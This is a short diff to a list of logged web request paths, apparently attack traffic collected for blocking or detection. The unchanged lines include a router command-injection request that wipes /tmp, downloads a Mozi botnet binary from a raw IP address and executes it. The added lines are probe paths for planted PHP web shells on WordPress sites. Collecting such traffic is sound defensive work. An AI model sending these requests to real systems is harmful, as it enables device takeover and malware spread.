@@ -1128,3 +1128,15 @@ example.com:80
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.209.81.10:34250/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /shell?cd+/tmp;rm+-rf+*;wget+
 /shop/wp-login.php
+/.well-known/alfanew.php
+/wp-content/uploads/upload_handler.php
+/wp-admin/S7fHiMZBUg1.php
+/wp-content/themes/twentynineteen/inc/ty.php
+/wp-admin/css/colors/blue/blkafewl.php
+/defense.php
+/.well-known/plugins.php
+/profile.php
+/wp-admin/includes/1975Team.php
+/asus.php
+/wp-content/uploads/ethwwuzd.php
+/wordpress/about.php
